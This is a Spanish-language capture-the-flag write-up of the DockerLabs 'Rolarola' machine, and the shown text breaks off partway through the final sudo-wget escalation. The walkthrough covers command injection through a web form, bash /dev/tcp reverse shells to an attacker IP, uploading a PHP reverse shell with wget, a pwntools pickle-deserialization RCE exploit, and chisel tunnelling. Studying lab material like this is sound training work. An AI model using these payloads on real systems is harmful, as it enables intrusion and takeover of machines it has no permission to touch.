![Screenshot](/medium/Rolarola/Images/machine.png)

Dificultad: **media**

Hecho por: **maciiii____**

# Pasos para comprometer el sistema 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* ⤵️  [Movimiento lateral](#movimiento-lateral)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

## 🛠️ Técnicas: Inyección de comandos, extracción de un repositorio .git, reenvío de puertos, explotación con pwntools, escalada de privilegios con Wget

---

En primer lugar, verificamos que la máquina esté activa, lo cual podemos hacer con el comando **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.158 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.138 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.135 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.135/0.143/0.158/0.010 ms
```

Ahora podemos comenzar con la fase de **reconocimiento**.

---

# Reconocimiento

Comenzamos con **nmap** para conocer qué puertos están abiertos en la máquina objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 00:55 -0500
Initiating ARP Ping Scan at 00:55
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:55, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:55
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:55, 3.23s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2026-01-05 00:55:05 -05 for 3s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65.535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ralentizar el escaneo.

**-sS** <- Con este argumento nmap realizará un escaneo de tipo "stealth", lo que significa que no completará el handshake de tres vías, lo cual hace el escaneo más rápido y menos detectable.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, lo que acelera aún más el escaneo.

**-Pn** <- Con este argumento nmap saltará la fase de descubrimiento de hosts, lo que significa que tratará a la máquina como activa y comenzará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap mostrará los puertos descubiertos abiertos durante el escaneo, lo que permite ver los resultados en tiempo real.

**--open** <- Con este argumento solo filtramos los puertos abiertos.

Al finalizar el escaneo, podemos ver que el puerto 80 está abierto, por lo que realizaremos otro escaneo para conocer qué servicios y versiones están ejecutándose en este puerto.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ nmap -p80 -sCV 172.17.0.2 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 00:57 -0500
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.66 ((Unix))
|_http-server-header: Apache/2.4.66 (Unix)
|_http-title: Mi primer web
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

**-p80** <- Con este argumento nmap solo escaneará el puerto 80.

**-sCV** <- Con este argumento nmap realizará un escaneo de versión para cada puerto, buscando posibles vulnerabilidades en sistemas no actualizados, y también ejecutará scripts para obtener más información sobre los puertos.

Podemos ver que se trata de un sitio web, por lo que podemos usar **whatweb** para identificar las tecnologías que utiliza.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.66 (Unix)], IP[172.17.0.2], PHP[8.5.1], Script, Title[Mi primer web], X-Powered-By[PHP/8.5.1]
```

Podemos ver que utiliza **php**, pero vamos a echar un vistazo al sitio web con nuestro navegador.

![Screenshot](/medium/Rolarola/Images/image1.png)

Y podemos ver esto, parece que podemos introducir un nombre, así que vamos a hacerlo y ver qué ocurre.

![Screenshot](/medium/Rolarola/Images/image2.png)

Podemos ver que parece que nuestro nombre se ha guardado en algún lugar, así que vamos a realizar un poco de enumeración.

---

# Enumeración

Vamos a usar **gobuster** para buscar posibles directorios y archivos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 483]
/names.txt            (Status: 200) [Size: 6]
```

Podemos ver que encontramos un archivo **names.txt**, así que vamos a echarle un vistazo con **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
```

Parece que se añaden nombres a este archivo, así que vamos a añadir un nombre, por ejemplo **leon**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
```

También se añade **leon** a este archivo, podemos intentar enviar payloads para ver si hay una inyección SQL, inyección de comandos, LDAP, etc.

Después de un poco de pruebas, podemos encontrar algo interesante cuando añadimos **;id**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
```

Parece que podemos ejecutar comandos, voy a intentar ejecutar un comando para ver el archivo passwd.

**;cat /etc/passwd**

```lua
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/enumeration]
└─$ curl http://172.17.0.2/names.txt -s
craft
leon
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
apache:x:100:101:apache:/var/www:/sbin/nologin
matsi:x:1000:1000::/home/matsi:/bin/bash
```

Y sí, podemos ver que podemos ejecutar comandos, así que voy a crear un script en Python para enviar comandos de forma más sencilla.

---

# Explotación

Necesitamos saber cómo se envía la información, así que voy a echar un vistazo al código fuente del sitio web.

```html
<form method="POST">
	<input type="text" name="nombre" placeholder="Escribe tu nombre" required>
	<button type="submit">Enviar</button>
</form>
```

Podemos ver que el parámetro **nombre** realiza una solicitud **POST** que parece ir al directorio raíz **/**

Bien, con esto voy a crear el script en Python.

```python
import requests, sys, signal

def stop(sig, frame):
    print("\n\n[!] QUITTING...")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def send_request(payload):
    target = "http://172.17.0.2"

    fun = {
        "nombre": f";{payload}"
    }

    requests.post(url=target, data=fun)

    output = requests.get(url=target+"/names.txt")

    lines = output.text.strip().splitlines()[-10:]

    for line in lines: print(line)

def execute():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send_request(cmd)

if __name__ == "__main__":
    execute()
```

Con este script en Python, cuando ejecutamos un comando, solo se mostrarán las últimas 10 líneas del archivo.

Bien, vamos a usarlo.

```r
[*] CMD -> ls -la
ff02::2 ip6-allrouters
172.17.0.2      46743728d906
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
total 32
drwxr-xr-x    1 apache   apache        4096 Dec 29 05:37 .
drwxr-xr-x    1 root     root          4096 Dec 29 05:18 ..
-rw-r--r--    1 apache   apache         949 Dec 29 05:51 index.php
-rw-r--r--    1 apache   apache        1224 Jan  5 07:02 names.txt
-rw-r--r--    1 apache   apache         153 Dec 29 05:44 script.js
-rw-r--r--    1 apache   apache         360 Dec 29 05:45 style.css
```

Parece que estamos dentro del directorio del sitio web, vamos a intentar obtener una shell inversa.

Pero primero, vamos a ponernos en modo escucha con **netcat** para recibir la shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l** <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, lo que nos mostrará con más detalle la conexión que recibimos.

**-n** <- Hace que netcat omita la resolución DNS y solo utilice la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquier puerto no en uso.

Bien, vamos a ejecutar el comando.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ rlwrap python3 commands.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/1234 0>&1'
```

Pero no recibimos nada, después de probar con múltiples payloads por alguna razón no recibimos nada, probablemente haya reglas de un firewall.

Entonces vamos a usar un archivo con PHP de **pentestmonkey**, vamos a transferir este archivo, pero primero vamos a comprobar si tiene **wget** o **curl**.

```r
[*] CMD -> which wget
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
```

Podemos ver que existe **wget**, así que vamos a crear un servidor Python desde nuestra máquina atacante para transferir este archivo con **wget**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Bien, entonces con nuestro script en Python vamos a descargar nuestro archivo PHP, en mi caso es **reverse.php**.

```r
[*] CMD -> wget http://192.168.0.20/reverse.php
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
```

Y recibimos esto en nuestro servidor.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [05/Jan/2026 15:41:31] "GET /reverse.php HTTP/1.1" 200 -
```

Podemos ver que la transferencia fue exitosa.

```r
[*] CMD -> ls -la
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/usr/bin/wget
total 36
drwxr-xr-x    1 apache   apache        4096 Jan  5 20:41 .
drwxr-xr-x    1 root     root          4096 Dec 29 05:18 ..
-rw-r--r--    1 apache   apache         949 Dec 29 05:51 index.php
-rw-r--r--    1 apache   apache          90 Jan  5 20:39 names.txt
-rw-r--r--    1 apache   apache        2147 Jan  5 20:39 reverse.php
-rw-r--r--    1 apache   apache         153 Dec 29 05:44 script.js
-rw-r--r--    1 apache   apache         360 Dec 29 05:45 style.css
```

Y podemos ver que se guardó en el mismo directorio, vamos a ponernos de nuevo en modo escucha con **netcat** para recibir la shell.

Y luego vamos a ejecutarlo con nuestra herramienta.

```r
[*] CMD -> php reverse.php
```

Y recibimos esto:

```java
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 44628
Linux 9de7c43b90a1 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64 Linux
sh: w: not found
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
bash: cannot set terminal process group (11): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
9de7c43b90a1:/$
```

### Modificar la shell

Así que vamos a modificar esta shell porque es muy fea, vamos a hacer un tratamiento rápido.

Primero, como en este sistema el comando **script** no existe, vamos a iniciar una shell con **python3** y **pty**

```r
9de7c43b90a1:/$ which python3
which python3
/usr/bin/python3
```

Podemos ver que existe python3, entonces vamos a iniciar la shell con esto.

```r
9de7c43b90a1:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
```

Una vez hecho esto, vamos a suspender el proceso primero con **CTRL + Z**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de entrada y salida sean tratados como datos brutos.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto volvemos a reanudar nuestra shell inversa.

Cuando ejecutamos este comando, restablecemos el xterm:

```r
reset xterm
```

Esto va a restablecer la terminal.

Si queremos limpiar nuestra terminal, no podemos porque el término será diferente del xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```r
9de7c43b90a1:/$ export TERM=xterm
```

Y una última cosa, si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```r
9de7c43b90a1:/$ stty rows {num} columns {num}
```

Y finalmente se ve mucho mejor!

---

# Movimiento lateral

Después de muchos intentos para intentar escalar privilegios, podemos encontrar que existe algo interesante en el directorio **/opt/**

```r
9de7c43b90a1:/$ ls -la opt
total 12
drwxr-xr-x    1 root     root          4096 Dec 29 06:56 .
drwxr-xr-x    1 root     root          4096 Jan  5 20:13 ..
drwxr-sr-x    7 root     root          4096 Dec 29 06:56 .git
```

Encontramos un repositorio git, vamos a transferirlo, podemos usar **python3** para hacer un servidor y obtener el proyecto git con **wget** en nuestra máquina atacante.

```r
9de7c43b90a1:/opt$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Entonces en nuestra máquina atacante vamos a obtener todo el contenido.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ wget -r http://172.17.0.2:100/.git
```

Vamos a descargar todo el contenido de forma recursiva.

Después de descargar todo el contenido en nuestra máquina atacante, podemos ver un directorio.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files]
└─$ ls
172.17.0.2:100  reverse.php
```

Entonces vamos a entrar.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ ls -la
total 12
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 .
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 ..
drwxrwxr-x 7 craft craft 4096 Jan  5 16:04 .git
```

Podemos ver todo el contenido del proyecto **git**, con el comando **tree**.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ tree .git
.git
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── hooks
│   ├── applypatch-msg.sample
│   ├── commit-msg.sample
│   ├── index.html
│   ├── post-update.sample
│   ├── pre-applypatch.sample
│   ├── pre-commit.sample
│   ├── pre-merge-commit.sample
│   ├── prepare-commit-msg.sample
│   ├── pre-push.sample
│   ├── pre-rebase.sample
│   ├── pre-receive.sample
│   ├── push-to-checkout.sample
│   ├── sendemail-validate.sample
│   └── update.sample
├── index
├── info
│   ├── exclude
│   └── index.html
├── logs
│   ├── HEAD
│   ├── index.html
│   └── refs
│       ├── heads
│       │   ├── index.html
│       │   └── master
│       └── index.html
├── objects
│   ├── 11
│   │   ├── 9ed670ec345e6e9fa326a239b77b5ea81b11ba
│   │   └── index.html
│   ├── 39
│   │   ├── ccbfaa621474cdc8d1d007155244857cc6dbcc
│   │   └── index.html
│   ├── 9b
│   │   ├── e990f357a50a12ace9acc44a0d247edacd4702
│   │   └── index.html
│   ├── c5
│   │   ├── f76de56103094eb006e176840546c4f7ad4f9e
│   │   └── index.html
│   ├── index.html
│   ├── info
│   │   └── index.html
│   └── pack
│       └── index.html
└── refs
    ├── heads
    │   ├── index.html
    │   └── master
    ├── index.html
    └── tags
        └── index.html

16 directories, 41 files
```

Parece que tenemos todo el contenido.

Podemos intentar ver los registros del proyecto git con **git log**

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git log
commit 119ed670ec345e6e9fa326a239b77b5ea81b11ba (HEAD -> master)
Author: matsi <matsi@chain.dl>
Date:   Mon Dec 29 06:55:45 2025 +0000

    Mi primer commit?
```

Podemos ver un commit, y también un mensaje, podemos ver qué cambios se hicieron con este con ```git checkout <commit>```

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git checkout 119ed670ec345e6e9fa326a239b77b5ea81b11ba
D       app.py
D       objetivos.bin
Note: switching to '119ed670ec345e6e9fa326a239b77b5ea81b11ba'.
```

Podemos ver que se han eliminado dos archivos, **app.py** y **objetivos.bin**

Para recuperar esos archivos podemos ejecutar el siguiente comando: ```git reset --hard <commit>``` Pero una advertencia con este comando es que cuando recuperamos todo, lo hacemos **permanentemente**.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ git reset --hard 119ed670ec345e6e9fa326a239b77b5ea81b11ba
HEAD is now at 119ed67 Mi primer commit?
```

Ahora si vemos el directorio actual ahora contiene el script de Python y el archivo binario.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ ls
app.py  objetivos.bin
```

Echando un vistazo rápido al script de Python podemos ver esto:

```python
import socket
import pickle
import os

HOST = "127.0.0.1"
PORT = 6969
DATA_FILE = "objetivos.bin"
```

Podemos ver que parece que este script se está ejecutando en la máquina objetivo, vamos a ver si se está ejecutando, podemos comprobarlo con **netstat**

```r
9de7c43b90a1:/opt$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 127.0.0.1:6969          0.0.0.0:*               LISTEN      
tcp        0    137 172.17.0.2:58600        192.168.0.20:1234       ESTABLISHED 
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        1      0 ::ffff:172.17.0.2:80    ::ffff:172.17.0.1:56518 CLOSE_WAIT  
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ]         DGRAM                     18939
```

Podemos ver que se está ejecutando en la máquina objetivo, pero antes de eso, analicemos un poco el script de Python.

Y podemos ver 2 funciones importantes en el script, y esto es vulnerable a un **RCE**.

```python
def guardar_objetivo(blob):
    with open(DATA_FILE, "ab") as f:
        size = len(blob).to_bytes(4, "big")
        f.write(size + blob)   # guarda RAW, no pickle
```

Con esta función está guardando datos crudos en el **DATA_FILE** (objetivos.bin), esto es muy importante saberlo.

```python
def leer_objetivos():
    objetivos = []

    if not os.path.exists(DATA_FILE):
        return objetivos

    with open(DATA_FILE, "rb") as f:
        while True:
            size_bytes = f.read(4)
            if not size_bytes:
                break

            size = int.from_bytes(size_bytes, "big")
            data = f.read(size)

            objetivos.append(pickle.loads(data)) # VULNERABLE

    return objetivos
```

Y esta función es muy débil, porque utiliza **pickle** para cargar datos, esto es muy malo, porque podemos ejecutar comandos desde aquí, ¿y cómo funciona?

Es un poco difícil de explicar, necesitamos hablar sobre cómo Python realmente funciona con objetos serializados, un poco de bajo nivel y todo eso.

Si quieres saber más sobre todo esto y por qué pickle es una mala idea de usar, puedes echar un vistazo [aquí](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

En resumen, cuando **serializamos** datos con el formato pickle, estamos trabajando con bytes y cuando **deserializamos** es como recuperar nuevamente la información, pero cuando pickle deserializa está ejecutando byte por byte tan pronto como pickle lo hace.

Ejemplo:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

Este es el formato pickle.

Para deserializarlo necesitamos cargar esa cadena de bytes, y podemos ver que la información se recupera.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```

Podemos recuperar la información, y puedes ver por qué esto es vulnerable, podemos hacer un payload que en lugar de hacer todo esto podamos intentar importar la librería **os** y ejecutar código arbitrario.

Así que voy a hacer un script de Python para hacer todo esto por nosotros.

Voy a hacer un diagrama con **excalidraw** de cómo funciona el script vulnerable de Python.

![Screenshot](/medium/Rolarola/Images/image3es.png)

Espero que puedas entenderlo, así que voy a hacer el exploit con mi propia máquina aprovechando que tenemos el **app.py** con nosotros.

Voy a usar pwntools para enviar los datos y el payload, y conectarme al objetivo.

```python
from pwn import *
import signal, time, pickle, os

target = "127.0.0.1"
port = 6969

def stop(sig, frame):
    print()
    log.warn("QUITTING...")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def send(payload):
    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    malicious = pickle.dumps(RCE())

    connect = remote(target, port)

    connect.sendlineafter(b"> ", b"2")
    connect.sendafter(b"Nombre: ", b"pwned")
    connect.sendafter(b"Edad: ", b"999")

    connect.sendafter(b"Objetivo: ", malicious)

    connect.close()

    launch = remote(target, port)

    launch.sendlineafter(b"> ", b"1")
    print()
    log.warn("PAYLOAD EXECUTED")
    time.sleep(0.5)
    launch.close()

def execute():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send(cmd)

if __name__ == "__main__":
    execute()
```

Okay, entonces con mi propia máquina, dejemos que se ejecute el **app.py** y luego ejecutemos nuestro propio exploit.

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
```

Ahora dejemos que ejecutemos nuestro propio exploit y enviemos un comando.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ python3 exploit.py 

[*] CMD -> id
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

Y con el servidor de Python, podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
```

¡Funciona! Dejemos que lo hagamos de nuevo.

```r
[*] CMD -> ls -la
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

Y en nuestro servidor podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/medio/rolarola/files/172.17.0.2:100]
└─$ python3 app.py 
[+] Escuchando en 127.0.0.1:6969
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
total 20
drwxrwxr-x 3 craft craft 4096 Jan  5 17:49 .
drwxrwxr-x 3 craft craft 4096 Jan  5 16:04 ..
-rw-rw-r-- 1 craft craft 1854 Jan  5 16:23 app.py
drwxrwxr-x 7 craft craft 4096 Jan  5 16:23 .git
-rw-rw-r-- 1 craft craft   92 Jan  5 17:51 objetivos.bin
```

¡Nuestro exploit funciona!

Entonces, dejemos que obtengamos el puerto 6969 de la máquina objetivo, en resumen, reenvío de puertos.

Para obtener el puerto, necesitamos usar **chisel**, porque el puerto solo está en modo de escucha de la máquina objetivo, su **localhost**.

Primero, copiemos **chisel** a nuestro directorio de trabajo actual.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ cp /usr/bin/chisel .
```

Entonces, dejemos que hagamos un servidor de Python para descargar chisel de la máquina objetivo con wget.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Entonces, en la máquina objetivo, dejemos que lo descargue, por ejemplo, en el directorio **/tmp/**.

```r
9de7c43b90a1:/tmp$ wget http://192.168.0.20/chisel
--2026-01-05 23:02:30--  http://192.168.0.20/chisel
Connecting to 192.168.0.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240184 (9.8M) [application/octet-stream]
Saving to: 'chisel'

chisel    100%[====================>]   9.77M  --.-KB/s    in 0.04s   

2026-01-05 23:02:31 (223 MB/s) - 'chisel' saved [10240184/10240184]
```

Entonces, dejemos que les demos permisos de ejecutable con **chmod**.

```r
9de7c43b90a1:/tmp$ chmod +x chisel
```

Ahora, en nuestra máquina de ataque, dejemos que hagamos un servidor de **chisel** para recibir conexiones.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/files]
└─$ chisel server --reverse -p 1000
2026/01/05 18:06:59 server: Reverse tunnelling enabled
2026/01/05 18:06:59 server: Fingerprint 7n19TgnLTOHeaNjkp/cQxWzbENa4Awr+430bnIyaGRo=
2026/01/05 18:06:59 server: Listening on http://0.0.0.0:1000
```

Ahora dejemos que obtengamos el puerto 6969 de la máquina objetivo con chisel.

```r
9de7c43b90a1:/tmp$ ./chisel client 192.168.0.20:1000 R:6969:127.0.0.1:6969
2026/01/05 23:07:51 client: Connecting to ws://192.168.0.20:1000
2026/01/05 23:07:51 client: Connected (Latency 844.606µs)
```

Okay, entonces con NUESTRO puerto 6969 será el localhost de la máquina TARGET con su puerto 6969.

Ahora, usemos nuestro exploit para obtener una shell inversa hacia nosotros con **netcat** de nuestra máquina de ataque.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Ahora dejemos que usemos nuestro propio exploit para hacer una shell inversa!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ python3 exploit.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/2222 0>&1'
[+] Opening connection to 127.0.0.1 on port 6969: Done
[*] Closed connection to 127.0.0.1 port 6969
[+] Opening connection to 127.0.0.1 on port 6969: Done

[!] PAYLOAD EXECUTED
[*] Closed connection to 127.0.0.1 port 6969
```

y recibimos esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/rolarola/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 43096
bash: cannot set terminal process group (18): Not a tty
bash: no job control in this shell
9de7c43b90a1:~$ whoami
whoami
matsi
```

¡Ahora somos el usuario **matsi**!

Y de nuevo, modifiquemos la shell para operar más cómodo, como hicimos antes [aquí](#modificar-la-shell)

---
# Escalada de Privilegios

Cuando ejecutamos **sudo -l** tenemos un privilegio de **SUDOER**

```r
9de7c43b90a1:~$ sudo -l
Matching Defaults entries for matsi on 9de7c43b90a1:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for matsi:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User matsi may run the following commands on 9de7c43b90a1:
    (ALL : ALL) NOPASSWD: /usr/bin/wget
```

Podemos ejecutar el comando **wget** como cualquier usuario incluso el usuario **root**.

Entonces, podemos obtener un poco de **GTFOBins** para obtener una shell como el usuario **root** podemos hacer esto con los siguientes comandos:

```c
9de7c43b90a1:~$ funny=$(mktemp)
9de7c43b90a1:~$ chmod +x $funny
9de7c43b90a1:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$funny
